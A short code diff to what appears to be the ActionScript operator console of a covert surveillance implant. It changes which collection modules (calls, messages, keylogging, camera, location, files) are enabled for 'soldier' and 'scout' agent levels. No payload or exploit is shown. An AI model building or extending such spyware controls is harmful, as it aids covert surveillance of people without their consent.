@@ -114,15 +114,15 @@
 
 			private function enableModules():void
 			{
-				call.enabled=getModule('call') != null && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				calendar.enabled=(getModule('calendar') != null || getModule('addressbook') != null) && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				messages.enabled=(getModule('messages') != null || getModule('chat') != null) && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				url.enabled=getModule('url') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				file.enabled=getModule('file') != null && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				keylog.enabled=getModule('keylog') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				call.enabled=getModule('call') != null && currentAgent.level != "soldier" && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				calendar.enabled=(getModule('calendar') != null || getModule('addressbook') != null) && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				messages.enabled=(getModule('messages') != null || getModule('chat') != null) && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				url.enabled=getModule('url') != null && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				file.enabled=getModule('file') != null && currentAgent.level != "scout" && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				keylog.enabled=getModule('keylog') != null && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				screenshot.enabled=getModule('screenshot') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				camera.enabled=getModule('camera') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				position.enabled=getModule('position') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				camera.enabled=getModule('camera') != null && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+				position.enabled=getModule('position') != null && currentAgent.level != "scout" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 			}
 
 			private function selectModules():void
@@ -163,6 +163,7 @@
           url.selected=false;
           keylog.selected=false;
           camera.selected=false;
+          file.selected=false;
 
 					if (currentAgent.demo)
 					{
